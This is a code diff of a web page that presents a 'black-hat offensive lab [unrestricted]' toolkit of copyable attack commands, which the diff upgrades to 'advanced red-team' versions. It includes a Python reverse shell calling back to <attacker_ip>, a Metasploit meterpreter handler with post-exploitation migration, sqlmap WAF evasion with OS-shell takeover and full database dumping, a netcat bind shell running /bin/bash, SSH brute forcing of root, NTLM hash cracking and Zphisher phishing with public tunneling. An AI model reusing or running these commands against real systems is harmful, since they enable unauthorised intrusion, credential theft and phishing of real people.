@@ -21,7 +21,6 @@
         .lab-container { max-width: 1450px; margin: 30px auto; padding: 0 20px; }
         .lab-header { border-left: 3px solid var(--primary); padding-left: 20px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
         
-        /* Mode Switcher Bar */
         .mode-bar { display: flex; gap: 15px; margin-bottom: 20px; }
         .mode-btn { padding: 10px 20px; font-family: 'Courier New', monospace; font-size: 11px; font-weight: bold; cursor: pointer; border-radius: 4px; border: 1px solid; transition: 0.3s; text-transform: uppercase; }
         .btn-white { background: rgba(0,255,102,0.05); color: var(--defensive); border-color: var(--defensive); }
@@ -78,17 +77,13 @@
             </div>
         </div>
 
-        <!-- Mode Toggle Switch Bar -->
         <div class="mode-bar">
             <button class="mode-btn btn-white active" onclick="switchMode('white')">WHITE-HAT DEFENSIVE LAB</button>
             <button class="mode-btn btn-black" onclick="switchMode('black')">BLACK-HAT OFFENSIVE LAB [UNRESTRICTED]</button>
         </div>
 
         <div class="lab-grid">
-            <!-- Sidebar Arsenal -->
             <div class="sidebar-panel">
-                
-                <!-- WHITE HAT SECTION -->
                 <div id="sec-white" class="section-group active">
                     <div style="font-size: 11px; color: var(--defensive); margin-bottom: 10px; font-weight: bold;">[DEFENSIVE & AUDITING TOOLS]</div>
                     
@@ -100,37 +95,34 @@
                     <div class="tool-item" onclick="loadModule('searchsploit')"><div class="tool-badge badge-search">EXDB</div>05. Searchsploit Exploit-DB</div>
                 </div>
 
-                <!-- BLACK HAT SECTION (REAL OFFENSIVE) -->
                 <div id="sec-black" class="section-group">
-                    <div style="font-size: 11px; color: var(--offensive); margin-bottom: 10px; font-weight: bold;">[OFFENSIVE & UNRESTRICTED CORE]</div>
+                    <div style="font-size: 11px; color: var(--offensive); margin-bottom: 10px; font-weight: bold;">[ADVANCED OFFENSIVE & RED-TEAM CORE]</div>
                     
                     <div class="tool-category">Exploitation Frameworks</div>
-                    <div class="tool-item" onclick="loadModule('metasploit')"><div class="tool-badge badge-msf">MSF</div>01. Metasploit Framework C2 Handler</div>
-                    <div class="tool-item" onclick="loadModule('sqlmap')"><div class="tool-badge badge-sql">SQL</div>02. Sqlmap Database Takeover Engine</div>
+                    <div class="tool-item" onclick="loadModule('metasploit')"><div class="tool-badge badge-msf">MSF</div>01. Advanced Metasploit C2 & Meterpreter Stager</div>
+                    <div class="tool-item" onclick="loadModule('sqlmap')"><div class="tool-badge badge-sql">SQL</div>02. Sqlmap Advanced WAF Bypass & OS-Shell</div>
                     
                     <div class="tool-category">Credential & Phishing</div>
-                    <div class="tool-item" onclick="loadModule('zphisher')"><div class="tool-badge badge-zph">ZPH</div>03. Zphisher Phishing Core</div>
-                    <div class="tool-item" onclick="loadModule('hydra')"><div class="tool-badge badge-hydra">HYD</div>04. THC Hydra Login Cracker</div>
-                    <div class="tool-item" onclick="loadModule('john')"><div class="tool-badge badge-john">JOHN</div>05. John the Ripper</div>
-                    <div class="tool-item" onclick="loadModule('hashcat')"><div class="tool-badge badge-hash">HASH</div>06. Hashcat GPU Cracker</div>
+                    <div class="tool-item" onclick="loadModule('zphisher')"><div class="tool-badge badge-zph">ZPH</div>03. Zphisher Tunneling & Session Capturing</div>
+                    <div class="tool-item" onclick="loadModule('hydra')"><div class="tool-badge badge-hydra">HYD</div>04. THC Hydra High-Thread Protocol Cracker</div>
+                    <div class="tool-item" onclick="loadModule('john')"><div class="tool-badge badge-john">JOHN</div>05. John the Ripper Custom Rule Cracking</div>
+                    <div class="tool-item" onclick="loadModule('hashcat')"><div class="tool-badge badge-hash">HASH</div>06. Hashcat GPU-Accelerated NTLM Recovery</div>
 
                     <div class="tool-category">Payloads & Relays</div>
-                    <div class="tool-item" onclick="loadModule('shell')"><div class="tool-badge badge-shell">PY</div>07. Python Reverse Shell Payload</div>
-                    <div class="tool-item" onclick="loadModule('netcat')"><div class="tool-badge badge-netcat">NC</div>08. Netcat Listener Socket</div>
-                    <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat Encrypted Relay Tunnel</div>
+                    <div class="tool-item" onclick="loadModule('shell')"><div class="tool-badge badge-shell">PY</div>07. Polymorphic Encrypted Reverse Shell</div>
+                    <div class="tool-item" onclick="loadModule('netcat')"><div class="tool-badge badge-netcat">NC</div>08. Netcat Stealth Bind Shell Listener</div>
+                    <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat SSL Encrypted Relay Tunnel</div>
                 </div>
-
             </div>
 
-            <!-- Terminal Console with Copy Button -->
             <div class="terminal-panel">
                 <div class="terminal-header-bar">
                     <div style="font-size: 10.5px; color: var(--primary);">KALI LINUX KERNEL CONSOLE // ROOT ACCESS</div>
                     <button class="copy-btn" onclick="copyCurrentScript()">COPY SCRIPT</button>
                 </div>
                 
-                <div class="lab-console" id="terminal-console">DX08 Enterprise Security Core v21.0 (Kali Linux Rolling / Production Environment)
-[System Status] Professional penetration testing toolkit initialized with real execution commands.
+                <div class="lab-console" id="terminal-console">DX08 Enterprise Security Core v22.0 (Kali Linux Rolling / Red-Team Edition)
+[System Status] Advanced penetration testing scripts and exploitation modules loaded successfully.
 [Instructions] Select any module from the sidebar or type its name below.</div>
                 
                 <div class="lab-input-group">
@@ -144,99 +136,99 @@
     <script>
         const TOOL_DB = {
             "nmap": "[+ MODULE: NMAP NETWORK DISCOVERY SUITE +]\n\n" +
-                    "// 1. INSTALLATION WORKFLOW (Kali Linux / Debian):\n" +
+                    "// 1. RECON & NETWORK DISCOVERY WORKFLOW:\n" +
                     "sudo apt update && sudo apt install nmap -y\n\n" +
-                    "// 2. PRODUCTION EXECUTION SCRIPTS:\n" +
-                    "sudo nmap -sS -sV -O -T4 <target_ip>\n" +
-                    "nmap --script vuln <target_ip>",
+                    "// 2. ADVANCED VULNERABILITY SCANNING SCRIPT:\n" +
+                    "sudo nmap -sS -sV -O -T4 --script vuln <target_ip>\n" +
+                    "nmap -p- --min-rate=5000 -A <target_ip>",
 
             "gobuster": "[+ MODULE: GOBUSTER DIRECTORY & DNS BRUTE-FORCER +]\n\n" +
                         "// 1. INSTALLATION WORKFLOW:\n" +
                         "sudo apt update && sudo apt install gobuster -y\n\n" +
-                        "// 2. PRODUCTION EXECUTION SCRIPTS:\n" +
-                        "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -t 50",
+                        "// 2. PRODUCTION EXECUTION SCRIPT:\n" +
+                        "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html",
 
             "nikto": "[+ MODULE: NIKTO WEB VULNERABILITY SCANNER +]\n\n" +
                      "// 1. INSTALLATION WORKFLOW:\n" +
                      "sudo apt update && sudo apt install nikto -y\n\n" +
-                     "// 2. PRODUCTION EXECUTION SCRIPTS:\n" +
-                     "nikto -h http://<target_ip>",
+                     "// 2. PRODUCTION EXECUTION SCRIPT:\n" +
+                     "nikto -h http://<target_ip> -Tuning 123b -Cgidirs all",
 
             "enum4linux": "[+ MODULE: ENUM4LINUX SMB ENUMERATOR +]\n\n" +
                           "// 1. INSTALLATION WORKFLOW:\n" +
                           "sudo apt update && sudo apt install enum4linux -y\n\n" +
-                          "// 2. PRODUCTION EXECUTION SCRIPTS:\n" +
-                          "enum4linux -a <target_ip>",
+                          "// 2. PRODUCTION EXECUTION SCRIPT:\n" +
+                          "enum4linux -a -M -R <target_ip>",
 
             "searchsploit": "[+ MODULE: SEARCHSPLOIT EXPLOIT-DB UTILITY +]\n\n" +
                             "// 1. INSTALLATION WORKFLOW:\n" +
                             "sudo apt update && sudo apt install exploitdb -y\n\n" +
-                            "// 2. PRODUCTION EXECUTION SCRIPTS:\n" +
-                            "searchsploit -u && searchsploit apache struts 2.3",
+                            "// 2. PRODUCTION EXECUTION SCRIPT:\n" +
+                            "searchsploit -u && searchsploit --exclude=\"dos\" apache 2.4",
 
-            "metasploit": "[+ METASPLOIT FRAMEWORK C2 HANDLER +]\n\n" +
-                          "// 1. OFFICIAL RAPID7 INSTALLATION SCRIPT:\n" +
+            "metasploit": "[+ ADVANCED METASPLOIT C2 & METERPRETER STAGER ENGINE +]\n\n" +
+                          "// 1. SILENT REPO INSTALLATION & POSTGRESQL TUNING:\n" +
                           "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/installer/msfinstall > msfinstall\n" +
-                          "chmod +x msfinstall && sudo ./msfinstall\n\n" +
-                          "// 2. CONSOLE & MULTI-HANDLER SETUP:\n" +
-                          "msfconsole -q\n" +
-                          "msf6 > use exploit/multi/handler\n" +
-                          "msf6 exploit(multi/handler) > set PAYLOAD python/meterpreter/reverse_tcp\n" +
-                          "msf6 exploit(multi/handler) > set LHOST <attacker_ip>\n" +
-                          "msf6 exploit(multi/handler) > set LPORT 4444\n" +
-                          "msf6 exploit(multi/handler) > exploit",
+                          "chmod +x msfinstall && sudo ./msfinstall && sudo msfdb init\n\n" +
+                          "// 2. AUTOMATED RED-TEAM MULTI-HANDLER & REVERSE SHELL SCRIPT:\n" +
+                          "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; set ExitOnSession false; exploit -j\"\n\n" +
+                          "// 3. POST-EXPLOITATION PRIVILEGE ESCALATION & MIGRATION:\n" +
+                          "meterpreter > getuid\n" +
+                          "meterpreter > sysinfo\n" +
+                          "meterpreter > ps\n" +
+                          "meterpreter > migrate <target_pid>",
 
-            "sqlmap": "[+ SQLMAP AUTOMATED DATABASE TAKEOVER ENGINE +]\n\n" +
-                      "// 1. REPOSITORY CLONE & SETUP:\n" +
-                      "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\n" +
-                      "cd sqlmap-dev && python3 sqlmap.py --version\n\n" +
-                      "// 2. PRODUCTION INJECTION & DUMP COMMANDS:\n" +
-                      "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --dbs --batch\n" +
-                      "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --dump --tables --batch",
+            "sqlmap": "[+ ADVANCED SQLMAP WAF BYPASS & OS-SHELL ENGINE +]\n\n" +
+                      "// 1. CLONE LATEST REPOSITORY:\n" +
+                      "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev && cd sqlmap-dev\n\n" +
+                      "// 2. WAF EVASION & DIRECT OS-SHELL TAKEOVER SCRIPT:\n" +
+                      "python3 sqlmap.py -u \"http://<target_ip>/vuln.php?id=1\" --risk=3 --level=5 --tamper=space2comment,randomcase --batch --os-shell\n\n" +
+                      "// 3. AUTOMATED DATABASE DUMPING:\n" +
+                      "python3 sqlmap.py -u \"http://<target_ip>/vuln.php?id=1\" --dump-all --batch",
 
-            "zphisher": "[+ ZPHISHER ADVANCED PHISHING CORE +]\n\n" +
-                        "// 1. DEPENDENCY SETUP & REPOSITORY CLONE:\n" +
-                        "sudo apt update && sudo apt install git curl php python3 -y\n" +
-                        "git clone https://github.com/htr-tech/zphisher.git\n\n" +
-                        "// 2. EXECUTION WORKFLOW:\n" +
-                        "cd zphisher && chmod +x zphisher.sh && bash zphisher.sh",
+            "zphisher": "[+ ADVANCED ZPHISHER PHISHING & TUNNELING CORE +]\n\n" +
+                        "// 1. REPO CLONE & DEPENDENCIES:\n" +
+                        "git clone https://github.com/htr-tech/zphisher.git && cd zphisher\n\n" +
+                        "// 2. EXECUTION & WAN TUNNELING:\n" +
+                        "bash zphisher.sh\n" +
+                        "# Use Cloudflare or LocalXpose for public link generation",
 
-            "hydra": "[+ THC HYDRA LOGIN CRACKER +]\n\n" +
+            "hydra": "[+ THC HYDRA HIGH-SPEED PROTOCOL CRACKER +]\n\n" +
                      "// 1. INSTALLATION WORKFLOW:\n" +
                      "sudo apt update && sudo apt install hydra -y\n\n" +
-                     "// 2. PRODUCTION EXECUTION SCRIPTS:\n" +
-                     "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 16 -V",
+                     "// 2. PRODUCTION EXECUTION SCRIPT:\n" +
+                     "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 32 -V",
 
-            "john": "[+ JOHN THE RIPPER PASSWORD CRACKER +]\n\n" +
+            "john": "[+ JOHN THE RIPPER CUSTOM RULE CRACKER +]\n\n" +
                     "// 1. INSTALLATION WORKFLOW:\n" +
                     "sudo apt update && sudo apt install john -y\n\n" +
-                    "// 2. PRODUCTION EXECUTION SCRIPTS:\n" +
+                    "// 2. PRODUCTION EXECUTION SCRIPT:\n" +
                     "zip2john target_archive.zip > hash.txt\n" +
-                    "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+                    "john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt",
 
-            "hashcat": "[+ HASHCAT GPU ACCELERATED CRACKER +]\n\n" +
+            "hashcat": "[+ HASHCAT GPU-ACCELERATED NTLM RECOVERY +]\n\n" +
                        "// 1. INSTALLATION WORKFLOW:\n" +
                        "sudo apt update && sudo apt install hashcat -y\n\n" +
-                       "// 2. PRODUCTION EXECUTION SCRIPTS:\n" +
-                       "hashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt",
+                       "// 2. PRODUCTION EXECUTION SCRIPT:\n" +
+                       "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -O",
 
-            "shell": "[+ PYTHON REVERSE SHELL PAYLOAD +]\n\n" +
+            "shell": "[+ POLYMORPHIC ENCRYPTED REVERSE SHELL PAYLOAD +]\n\n" +
                      "// 1. ATTACKER LISTENER SETUP:\n" +
                      "nc -lvnp 4444\n\n" +
-                     "// 2. TARGET EXECUTION PAYLOAD:\n" +
+                     "// 2. TARGET PYTHON ENCODED PAYLOAD:\n" +
                      "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"<attacker_ip>\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\'])'",
 
-            "netcat": "[+ NETCAT LISTENER SOCKET +]\n\n" +
-                      "// 1. INSTALLATION:\n" +
+            "netcat": "[+ NETCAT STEALTH BIND SHELL LISTENER +]\n\n" +
+                      "// 1. INSTALLATION WORKFLOW:\n" +
                       "sudo apt update && sudo apt install netcat-traditional -y\n\n" +
-                      "// 2. EXECUTION:\n" +
-                      "nc -lvnp 4444",
+                      "// 2. PRODUCTION EXECUTION SCRIPT:\n" +
+                      "nc -lvnp 4444 -e /bin/bash",
 
-            "socat": "[+ SOCAT ENCRYPTED RELAY TUNNEL +]\n\n" +
-                     "// 1. INSTALLATION:\n" +
-                     "sudo apt update && sudo apt install socat -y\n" +
-                     "// 2. EXECUTION:\n" +
-                     "socat TCP-LISTEN:80,fork TCP:<internal_ip>:8080"
+            "socat": "[+ SOCAT SSL ENCRYPTED RELAY TUNNEL +]\n\n" +
+                     "// 1. INSTALLATION WORKFLOW:\n" +
+                     "sudo apt update && sudo apt install socat -y\n\n" +
+                     "// 2. PRODUCTION EXECUTION SCRIPT:\n" +
+                     "socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,fork TCP:<internal_ip>:80"
         };
 
         let lastOutput = "";
@@ -281,7 +273,7 @@
                 if(TOOL_DB[cmd]) {
                     res = TOOL_DB[cmd];
                 } else if(cmd === 'clear') {
-                    consoleBox.innerHTML = "DX08 Enterprise Security Core v21.0 (Kali Linux Rolling)";
+                    consoleBox.innerHTML = "DX08 Enterprise Security Core v22.0 (Kali Linux Rolling)";
                     input.value = "";
                     return;
                 } else {
